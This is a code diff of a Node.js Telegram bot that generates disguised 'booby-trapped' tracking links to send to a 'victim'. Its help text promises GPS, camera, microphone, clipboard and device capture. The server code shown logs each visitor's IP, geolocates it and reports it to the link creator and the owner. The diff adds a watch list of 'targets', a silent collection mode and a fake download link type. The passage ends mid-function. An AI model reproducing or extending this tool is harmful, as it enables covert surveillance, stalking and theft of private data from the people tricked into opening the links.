@@ -1,93 +1,133 @@
 const fs = require("fs");
 const express = require("express");
 
-// Users storage
-const USERS_FILE = "./users.json";
-let users = new Set();
-try { JSON.parse(fs.readFileSync(USERS_FILE)).forEach(id => users.add(id)); } catch(e) { users = new Set(); }
-function saveUsers() { fs.writeFileSync(USERS_FILE, JSON.stringify([...users])); }
+// ── Storage helpers ────────────────────────────────────────────────────────────
 
-// Banned users storage
-const BANNED_FILE = "./banned.json";
-let banned = new Set();
-try { JSON.parse(fs.readFileSync(BANNED_FILE)).forEach(id => banned.add(id)); } catch(e) { banned = new Set(); }
-function saveBanned() { fs.writeFileSync(BANNED_FILE, JSON.stringify([...banned])); }
+function loadJSON(file, def) {
+  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch(e) { return def; }
+}
+function saveJSON(file, data) { fs.writeFileSync(file, JSON.stringify(data)); }
 
-// Stats storage
-const STATS_FILE = "./stats.json";
-let stats = { linksOpened: 0, linksCreated: 0 };
-try { stats = JSON.parse(fs.readFileSync(STATS_FILE)); } catch(e) {}
-function saveStats() { fs.writeFileSync(STATS_FILE, JSON.stringify(stats)); }
-
-// Settings storage
+const USERS_FILE    = "./users.json";
+const BANNED_FILE   = "./banned.json";
+const STATS_FILE    = "./stats.json";
 const SETTINGS_FILE = "./settings.json";
-let settings = { welcomeMsg: "", silentMode: false };
-try { settings = { welcomeMsg: "", silentMode: false, ...JSON.parse(fs.readFileSync(SETTINGS_FILE)) }; } catch(e) {}
-function saveSettings() { fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings)); }
+const TARGETS_FILE  = "./targets.json";
 
-var cors = require('cors');
-var bodyParser = require('body-parser');
-const fetch = require('node-fetch');
+let users    = new Set(loadJSON(USERS_FILE, []));
+let banned   = new Set(loadJSON(BANNED_FILE, []));
+let targets  = new Set(loadJSON(TARGETS_FILE, []));
+let stats    = { linksOpened: 0, linksCreated: 0, ...loadJSON(STATS_FILE, {}) };
+let settings = { welcomeMsg: "", silentMode: false, scheduleHour: -1, ...loadJSON(SETTINGS_FILE, {}) };
+
+function saveUsers()    { saveJSON(USERS_FILE,    [...users]); }
+function saveBanned()   { saveJSON(BANNED_FILE,   [...banned]); }
+function saveTargets()  { saveJSON(TARGETS_FILE,  [...targets]); }
+function saveStats()    { saveJSON(STATS_FILE,    stats); }
+function saveSettings() { saveJSON(SETTINGS_FILE, settings); }
+
+// ── Setup ─────────────────────────────────────────────────────────────────────
+
+const cors        = require('cors');
+const bodyParser  = require('body-parser');
+const fetch       = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
+
 const bot = new TelegramBot(process.env["bot"], { polling: true });
-var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
-var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
 const app = express();
-app.use(jsonParser);
-app.use(urlencodedParser);
+app.use(bodyParser.json({ limit: '20mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
 app.use(cors());
 app.set("view engine", "ejs");
 
-var hostURL = "https://bot-psue.onrender.com";
-var use1pt = false;
+const hostURL   = "https://bot-psue.onrender.com";
+const use1pt    = false;
 const BOT_OWNER = 6012675140;
 const REPLY_PREFIX = "📝 اكتب ردك على المستخدم\nUID:";
 
+// ── Startup notification ──────────────────────────────────────────────────────
+setTimeout(() => {
+  bot.sendMessage(BOT_OWNER,
+    `🟢 البوت تم تشغيله بنجاح!\n⏰ ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}`
+  ).catch(() => {});
+}, 3000);
+
+// ── Utilities ─────────────────────────────────────────────────────────────────
+
 function getIP(req) {
   if (req.headers['x-forwarded-for']) return req.headers['x-forwarded-for'].split(",")[0].trim();
-  if (req.connection && req.connection.remoteAddress) return req.connection.remoteAddress;
+  if (req.connection?.remoteAddress) return req.connection.remoteAddress;
   return req.ip;
 }
 
-// Fetch enriched IP info from ip-api
 async function enrichIP(ip) {
   try {
-    const data = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org,lat,lon,status`).then(r => r.json());
-    if (data.status === "success") {
-      return `🌍 الدولة: ${data.country}\n🏙️ المدينة: ${data.city}, ${data.regionName}\n📡 ISP: ${data.isp}\n🏢 المنظمة: ${data.org}\n📌 إحداثيات: ${data.lat}, ${data.lon}`;
+    const d = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org,lat,lon,status`).then(r => r.json());
+    if (d.status === "success") {
+      return `🌍 الدولة: ${d.country}\n🏙️ المدينة: ${d.city}, ${d.regionName}\n📡 ISP: ${d.isp}\n🏢 المنظمة: ${d.org}\n📌 ${d.lat}, ${d.lon}\n🗺️ https://maps.google.com/?q=${d.lat},${d.lon}`;
     }
   } catch(e) {}
   return null;
 }
 
-// Send notification (respects silent mode)
 function notify(targetId, message, opts) {
   if (settings.silentMode) return;
   bot.sendMessage(targetId, message, opts || {}).catch(() => {});
 }
 
-// ─── Routes ──────────────────────────────────────────────────────────────────
+function notifyPhoto(targetId, buffer, opts, info) {
+  if (settings.silentMode) return;
+  bot.sendPhoto(targetId, buffer, opts || {}, info).catch(() => {});
+}
+
+function notifyDoc(targetId, buffer, opts, info) {
+  if (settings.silentMode) return;
+  bot.sendDocument(targetId, buffer, opts || {}, info).catch(() => {});
+}
+
+function notifyLoc(targetId, lat, lon) {
+  if (settings.silentMode) return;
+  bot.sendLocation(targetId, lat, lon).catch(() => {});
+}
+
+// ── Daily scheduled report ────────────────────────────────────────────────────
+setInterval(() => {
+  if (settings.scheduleHour < 0) return;
+  const now = new Date();
+  if (now.getUTCHours() === settings.scheduleHour && now.getUTCMinutes() === 0) {
+    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
+    bot.sendMessage(BOT_OWNER,
+      `📅 تقرير يومي تلقائي\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د`
+    ).catch(() => {});
+  }
+}, 60 * 1000);
+
+// ── Routes ────────────────────────────────────────────────────────────────────
 
 async function handleLinkOpen(req, res, view) {
   const ip = getIP(req);
-  const d = new Date().toJSON().slice(0, 19).replace('T', ':');
+  const d  = new Date().toJSON().slice(0,19).replace('T',':');
   if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
 
   const creatorId = parseInt(req.params.path, 36);
   stats.linksOpened++;
   saveStats();
 
-  // Immediate notification
-  const quickMsg = `⚠️ تم فتح رابطك!\n⚓ IP: ${ip}\n⏰ الوقت: ${d} UTC`;
-  notify(creatorId, quickMsg);
-  if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `⚠️ تم فتح رابط!\n👤 منشئ ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`);
+  const isTarget = targets.has(creatorId);
+  const quickMsg = `${isTarget ? '🎯🚨 هدف فتح رابطك!' : '⚠️ تم فتح رابطك!'}\n⚓ IP: ${ip}\n⏰ ${d} UTC`;
 
-  // Enriched IP details (async - don't block render)
+  notify(creatorId, quickMsg);
+  if (creatorId !== BOT_OWNER) {
+    notify(BOT_OWNER, isTarget
+      ? `🎯🚨 هدف فتح رابطاً!\n👤 منشئ ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`
+      : `⚠️ تم فتح رابط!\n👤 منشئ ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`
+    );
+  }
+
   enrichIP(ip).then(info => {
-    if (info) {
-      notify(creatorId, `🔍 تفاصيل IP الضحية:\n⚓ IP: ${ip}\n${info}`);
-      if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 تفاصيل IP:\n⚓ IP: ${ip}\n${info}`);
-    }
+    if (!info) return;
+    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
+    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 تفاصيل IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
   });
 
   res.render(view, { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
@@ -96,38 +136,31 @@ async function handleLinkOpen(req, res, view) {
 app.get("/w/:path/:uri",  (req, res) => handleLinkOpen(req, res, "webview"));
 app.get("/c/:path/:uri",  (req, res) => handleLinkOpen(req, res, "cloudflare"));
 app.get("/wa/:path/:uri", (req, res) => handleLinkOpen(req, res, "whatsapp"));
+app.get("/dl/:path/:uri", (req, res) => handleLinkOpen(req, res, "download"));
 
-
-// ─── Bot Logic ────────────────────────────────────────────────────────────────
+// ── Bot Logic ─────────────────────────────────────────────────────────────────
 
 bot.on('message', async (msg) => {
-  if (!msg || !msg.chat) return;
+  if (!msg?.chat) return;
   const chatId = msg.chat.id;
-
   if (banned.has(chatId)) return;
 
-  // ── URL link creation reply ───────────────────────────────────────────────
-  if (msg?.reply_to_message?.text === "🌐 Enter Your URL" && msg.text) {
+  if (msg?.reply_to_message?.text === "🌐 Enter Your URL" && msg.text)
     return createLink(chatId, msg.text);
-  }
 
-  // ── Broadcast reply ───────────────────────────────────────────────────────
   if (msg?.reply_to_message?.text === "📢 اكتب الرسالة التي تريد إرسالها للجميع:" && chatId === BOT_OWNER) {
     let sent = 0, failed = 0;
-    for (const uid of users) {
-      try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; }
-    }
-    return bot.sendMessage(chatId, `✅ تم الإرسال للجميع\n✔️ ناجح: ${sent}\n❌ فشل: ${failed}`);
+    for (const uid of users) { try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; } }
+    return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
   }
 
-  // ── Owner reply to user via force_reply ───────────────────────────────────
   if (chatId === BOT_OWNER && msg?.reply_to_message?.text?.startsWith(REPLY_PREFIX) && msg.text) {
     const uidStr = msg.reply_to_message.text.replace(REPLY_PREFIX, "").split("\n")[0].trim();
     const targetId = parseInt(uidStr);
     if (!isNaN(targetId)) {
       try {
         await bot.sendMessage(targetId, `📩 رسالة:\n\n${msg.text}`);
-        return bot.sendMessage(chatId, `✅ تم إرسال ردك.`);
+        return bot.sendMessage(chatId, `✅ تم الإرسال.`);
       } catch(e) { return bot.sendMessage(chatId, `❌ فشل: ${e.message}`); }
     }
   }
@@ -135,57 +168,63 @@ bot.on('message', async (msg) => {
   users.add(chatId);
   saveUsers();
 
-  // ── Forward user messages to owner ───────────────────────────────────────
   if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/")) {
-    const name = msg.chat.first_name || "مجهول";
+    const name     = msg.chat.first_name || "مجهول";
     const username = msg.chat.username ? `@${msg.chat.username}` : "لا يوجد";
-    bot.sendMessage(
-      BOT_OWNER,
-      `📩 رسالة من مستخدم:\n👤 ${name}\n🔗 ${username}\n🆔 ${chatId}\n\n💬 ${msg.text}`,
+    const isTargetUser = targets.has(chatId);
+    bot.sendMessage(BOT_OWNER,
+      `${isTargetUser ? '🎯 رسالة من هدف:\n' : '📩 رسالة من مستخدم:\n'}👤 ${name}\n🔗 ${username}\n🆔 ${chatId}\n\n💬 ${msg.text}`,
       { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "📩 رد على المستخدم", callback_data: `reply:${chatId}` }]] }) }
     );
   }
 
   // ── Commands ──────────────────────────────────────────────────────────────
 
-  if (msg.text == "/myid") {
+  if (msg.text === "/myid")
     return bot.sendMessage(chatId, `🆔 الـ ID:\n\`${chatId}\``, { parse_mode: "Markdown" });
-  }
 
-  if (msg.text && (msg.text === "/broadcast" || msg.text.startsWith("/broadcast "))) {
+  if (msg.text?.startsWith("/broadcast")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    if (msg.text.trim() === "/broadcast") {
-      return bot.sendMessage(chatId, "📢 اكتب الرسالة التي تريد إرسالها للجميع:", { reply_markup: JSON.stringify({ force_reply: true }) });
-    }
+    if (msg.text.trim() === "/broadcast")
+      return bot.sendMessage(chatId, "📢 اكتب الرسالة:", { reply_markup: JSON.stringify({ force_reply: true }) });
     const text = msg.text.replace("/broadcast ", "");
     let sent = 0, failed = 0;
     for (const uid of users) { try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; } }
     return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
   }
 
-  if (msg.text == "/stats") {
+  if (msg.text === "/stats") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    const up = Math.floor(process.uptime());
-    const h = Math.floor(up / 3600), m = Math.floor((up % 3600) / 60);
-    const silent = settings.silentMode ? "🔕 مفعّل" : "🔔 معطّل";
-    return bot.sendMessage(chatId, `📊 إحصائيات البوت:\n\n👥 المستخدمون: ${users.size}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n🔕 الوضع الصامت: ${silent}\n⏱️ وقت التشغيل: ${h}س ${m}د`);
+    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
+    return bot.sendMessage(chatId,
+      `📊 إحصائيات البوت:\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل 🔴' : 'معطّل 🟢'}\n📅 التقرير التلقائي: ${settings.scheduleHour >= 0 ? settings.scheduleHour+':00 UTC' : 'معطّل'}\n⏱️ وقت التشغيل: ${h}س ${m}د`
+    );
   }
 
-  if (msg.text == "/users") {
+  if (msg.text === "/report") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
+    const targetList = targets.size ? [...targets].join(", ") : "لا يوجد";
+    return bot.sendMessage(chatId,
+      `📋 تقرير شامل\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف (${targets.size}): ${targetList}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د\n⏰ الوقت الآن: ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC`
+    );
+  }
+
+  if (msg.text === "/users") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
-    const list = [...users].map((id, i) => `${i + 1}. \`${id}\``).join("\n");
+    const list = [...users].map((id,i) => `${i+1}. \`${id}\`${targets.has(id) ? ' 🎯' : ''}`).join("\n");
     return bot.sendMessage(chatId, `👥 المستخدمون (${users.size}):\n\n${list}`, { parse_mode: "Markdown" });
   }
 
-  if (msg.text == "/banned") {
+  if (msg.text === "/banned") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     if (banned.size === 0) return bot.sendMessage(chatId, "✅ لا يوجد محجوبون.");
-    const list = [...banned].map((id, i) => `${i + 1}. \`${id}\``).join("\n");
+    const list = [...banned].map((id,i) => `${i+1}. \`${id}\``).join("\n");
     return bot.sendMessage(chatId, `🚫 المحجوبون (${banned.size}):\n\n${list}`, { parse_mode: "Markdown" });
   }
 
-  if (msg.text && msg.text.startsWith("/ban ")) {
+  if (msg.text?.startsWith("/ban ")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const id = parseInt(msg.text.replace("/ban ", "").trim());
     if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
@@ -193,7 +232,7 @@ bot.on('message', async (msg) => {
     return bot.sendMessage(chatId, `🚫 تم حجب: \`${id}\``, { parse_mode: "Markdown" });
   }
 
-  if (msg.text && msg.text.startsWith("/unban ")) {
+  if (msg.text?.startsWith("/unban ")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const id = parseInt(msg.text.replace("/unban ", "").trim());
     if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
@@ -201,127 +240,159 @@ bot.on('message', async (msg) => {
     return bot.sendMessage(chatId, `✅ رُفع الحجب عن: \`${id}\``, { parse_mode: "Markdown" });
   }
 
-  if (msg.text && msg.text.startsWith("/deleteuser ")) {
+  if (msg.text?.startsWith("/deleteuser ")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const id = parseInt(msg.text.replace("/deleteuser ", "").trim());
     if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
     if (!users.has(id)) return bot.sendMessage(chatId, "⚠️ غير موجود.");
-    users.delete(id); saveUsers();
+    users.delete(id); targets.delete(id); saveUsers(); saveTargets();
     return bot.sendMessage(chatId, `🗑️ تم حذف \`${id}\`.`, { parse_mode: "Markdown" });
   }
 
-  if (msg.text == "/clearusers") {
+  if (msg.text === "/clearusers") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const count = users.size; users.clear(); saveUsers();
     return bot.sendMessage(chatId, `🗑️ تم مسح ${count} مستخدم.`);
   }
 
-  // /export — export users list as file
-  if (msg.text == "/export") {
+  if (msg.text === "/export") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
-    const content = `📋 قائمة مستخدمي البوت\nالتاريخ: ${new Date().toISOString()}\nالعدد: ${users.size}\n\n` + [...users].map((id, i) => `${i + 1}. ${id}`).join("\n");
+    const content = `📋 قائمة مستخدمي البوت\nالتاريخ: ${new Date().toISOString()}\nالعدد: ${users.size}\n\n` +
+      [...users].map((id,i) => `${i+1}. ${id}${targets.has(id) ? ' [هدف]' : ''}`).join("\n");
     const buf = Buffer.from(content, 'utf8');
     return bot.sendDocument(chatId, buf, { caption: `📤 قائمة المستخدمين (${users.size})` }, { filename: "users.txt", contentType: "text/plain" });
   }
 
-  // /silent — toggle silent mode
-  if (msg.text == "/silent") {
+  if (msg.text === "/silent") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    settings.silentMode = !settings.silentMode;
-    saveSettings();
+    settings.silentMode = !settings.silentMode; saveSettings();
     return bot.sendMessage(chatId, settings.silentMode
-      ? "🔕 الوضع الصامت مفعّل\nالبيانات تُجمع بدون إشعارات."
+      ? "🔕 الوضع الصامت مفعّل\nالبيانات تُجمع بصمت تام."
       : "🔔 الوضع الصامت معطّل\nستصلك جميع الإشعارات."
     );
   }
 
-  if (msg.text && msg.text.startsWith("/link ")) {
+  // /addtarget [id] — mark user as priority target
+  if (msg.text?.startsWith("/addtarget ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const id = parseInt(msg.text.replace("/addtarget ", "").trim());
+    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
+    targets.add(id); saveTargets();
+    return bot.sendMessage(chatId, `🎯 تم إضافة \`${id}\` كهدف.\nستحصل على تنبيه خاص عند نشاطه.`, { parse_mode: "Markdown" });
+  }
+
+  // /removetarget [id]
+  if (msg.text?.startsWith("/removetarget ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const id = parseInt(msg.text.replace("/removetarget ", "").trim());
+    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
+    targets.delete(id); saveTargets();
+    return bot.sendMessage(chatId, `✅ تم إزالة \`${id}\` من الأهداف.`, { parse_mode: "Markdown" });
+  }
+
+  // /targets — list all targets
+  if (msg.text === "/targets") {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    if (targets.size === 0) return bot.sendMessage(chatId, "لا يوجد أهداف حالياً.");
+    const list = [...targets].map((id,i) => `${i+1}. \`${id}\``).join("\n");
+    return bot.sendMessage(chatId, `🎯 الأهداف (${targets.size}):\n\n${list}`, { parse_mode: "Markdown" });
+  }
+
+  // /schedule [hour] — set daily report hour (UTC), -1 to disable
+  if (msg.text?.startsWith("/schedule")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    if (msg.text.trim() === "/schedule") {
+      return bot.sendMessage(chatId, `📅 التقرير التلقائي: ${settings.scheduleHour >= 0 ? settings.scheduleHour+':00 UTC' : 'معطّل'}\n\nلضبطه: /schedule [ساعة 0-23 UTC]\nلإيقافه: /schedule off`);
+    }
+    const arg = msg.text.replace("/schedule ", "").trim();
+    if (arg === "off") {
+      settings.scheduleHour = -1; saveSettings();
+      return bot.sendMessage(chatId, "✅ تم إيقاف التقرير التلقائي.");
+    }
+    const h = parseInt(arg);
+    if (isNaN(h) || h < 0 || h > 23) return bot.sendMessage(chatId, "⚠️ أدخل ساعة بين 0 و 23 (UTC).");
+    settings.scheduleHour = h; saveSettings();
+    return bot.sendMessage(chatId, `✅ سيُرسل التقرير اليومي كل يوم الساعة ${h}:00 UTC`);
+  }
+
+  if (msg.text?.startsWith("/link ")) {
     return createLink(chatId, msg.text.replace("/link ", "").trim());
   }
 
-  if (msg.text == "/ping") {
+  if (msg.text === "/ping") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     const start = Date.now();
     const m = await bot.sendMessage(chatId, "🏓 Pong!");
-    const ms = Date.now() - start;
-    return bot.editMessageText(`🏓 Pong! \`${ms}ms\``, { chat_id: chatId, message_id: m.message_id, parse_mode: "Markdown" });
+    return bot.editMessageText(`🏓 Pong! \`${Date.now()-start}ms\``, { chat_id: chatId, message_id: m.message_id, parse_mode: "Markdown" });
   }
 
-  if (msg.text && msg.text.startsWith("/setwelcome ")) {
+  if (msg.text?.startsWith("/setwelcome ")) {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
-    settings.welcomeMsg = msg.text.replace("/setwelcome ", "").trim();
-    saveSettings();
+    settings.welcomeMsg = msg.text.replace("/setwelcome ", "").trim(); saveSettings();
     return bot.sendMessage(chatId, `✅ تم تحديث رسالة الترحيب.`);
   }
 
-  if (msg.text == "/resetwelcome") {
+  if (msg.text === "/resetwelcome") {
     if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
     settings.welcomeMsg = ""; saveSettings();
-    return bot.sendMessage(chatId, `✅ تمت إعادة الترحيب للافتراضي.`);
+    return bot.sendMessage(chatId, `✅ تمت الإعادة للافتراضي.`);
   }
 
-  if (msg.text == "/start") {
+  if (msg.text === "/start") {
     const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: [
       [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
       [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }]
     ]}) };
     const welcome = settings.welcomeMsg ||
-      `مرحباً بڪ ${msg.chat.first_name}! 👋\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع الجغرافي (GPS+IP)\n📱 معلومات الجهاز والبطارية\n📷 صور الكاميرا\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة\n📋 محتوى الحافظة\n🔍 بيانات IP (ISP، مدينة، دولة)\n\n⚡ Powered by @Ye_x00`;
+      `مرحباً بڪ ${msg.chat.first_name}! 👋\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع (GPS + IP)\n📱 بيانات الجهاز الكاملة\n📷 صور الكاميرا الأمامية والخلفية\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة والسرعة\n📋 محتوى الحافظة\n🔍 ISP والدولة والمدينة\n\n⚡ Powered by @Ye_x00`;
     return bot.sendMessage(chatId, welcome, keyboard);
   }
 
-  if (msg.text == "/create") return createNew(chatId);
+  if (msg.text === "/create") return createNew(chatId);
 
-  if (msg.text == "/help") {
-    let helpText = `📖 طريقة الاستخدام:\n\n1️⃣ أنشئ رابطاً ملغماً\n2️⃣ أرسله للضحية\n\n📥 يصلك عند الفتح:\n   ⚡ إشعار فوري + تفاصيل IP\n   🌍 ISP والدولة والمدينة\n   📱 بيانات الجهاز\n   📷 صور الكاميرا\n   📍 الموقع (GPS أو IP)\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n\n🔗 ثلاثة أنواع روابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n\n⚡ Powered by @Ye_x00`;
+  if (msg.text === "/help") {
+    let t = `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك فوراً:\n   ⚡ IP + تفاصيل المزوّد\n   🌍 ISP، الدولة، المدينة\n   📱 بيانات الجهاز الكاملة\n   📷 صور الكاميرا (أمامية+خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n🔗 أنواع الروابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n   📁 Google Drive\n\n⚡ Powered by @Ye_x00`;
     if (chatId === BOT_OWNER) {
-      helpText += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات\n/users — المستخدمون\n/export — تصدير القائمة كملف\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف مستخدم\n/clearusers — مسح الكل\n/silent — تبديل الوضع الصامت 🔕\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/ping — اختبار السرعة\n\n💡 رد على مستخدم: زر 📩 على رسالته`;
+      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات\n/report — تقرير شامل فوري\n/users — المستخدمون\n/export — تصدير كملف\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/silent — الوضع الصامت 🔕\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/ping — اختبار السرعة`;
     }
-    return bot.sendMessage(chatId, helpText);
+    return bot.sendMessage(chatId, t);
   }
 });
 
-// ─── Callback Queries ─────────────────────────────────────────────────────────
+// ── Callback Queries ───────────────────────────────────────────────────────────
 
-bot.on('callback_query', async function(callbackQuery) {
-  bot.answerCallbackQuery(callbackQuery.id);
-  const chatId = callbackQuery.message.chat.id;
-  const data = callbackQuery.data;
+bot.on('callback_query', async (q) => {
+  bot.answerCallbackQuery(q.id);
+  const chatId = q.message.chat.id;
+  const data   = q.data;
 
   if (data === "crenew") return createNew(chatId);
-
+  if (data === "myid")   return bot.sendMessage(chatId, `🆔 الـ ID:\n\`${chatId}\``, { parse_mode: "Markdown" });
   if (data === "help") {
-    return bot.sendMessage(chatId, `📖 طريقة الاستخدام:\n\n1️⃣ أنشئ رابطاً ملغماً\n2️⃣ أرسله للضحية\n\n📥 يصلك:\n   ⚡ IP + تفاصيل المزوّد\n   📱 بيانات الجهاز\n   📷 صور الكاميرا\n   📍 موقع GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n\n⚡ Powered by @Ye_x00`);
+    return bot.sendMessage(chatId,
+      `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك:\n   ⚡ IP + ISP + الدولة\n   📱 بيانات الجهاز\n   📷 صور (أمامية + خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 بيانات الشبكة\n\n⚡ Powered by @Ye_x00`
+    );
   }
-
-  if (data === "myid") {
-    return bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });
-  }
-
   if (data.startsWith("reply:")) {
-    const targetId = data.replace("reply:", "");
-    return bot.sendMessage(chatId, `${REPLY_PREFIX}${targetId}\n\nاكتب ردك:`, { reply_markup: JSON.stringify({ force_reply: true }) });
+    return bot.sendMessage(chatId, `${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`, { reply_markup: JSON.stringify({ force_reply: true }) });
   }
 });
 
 bot.on('polling_error', () => {});
 
-
-// ─── Link Creation ────────────────────────────────────────────────────────────
+// ── Link Creation ──────────────────────────────────────────────────────────────
 
 async function createLink(cid, msg) {
   if (!msg || typeof msg !== 'string') return;
-  const encoded = [...msg].some(char => char.charCodeAt(0) > 127);
+  const encoded = [...msg].some(c => c.charCodeAt(0) > 127);
   if (msg.toLowerCase().includes('http') && !encoded) {
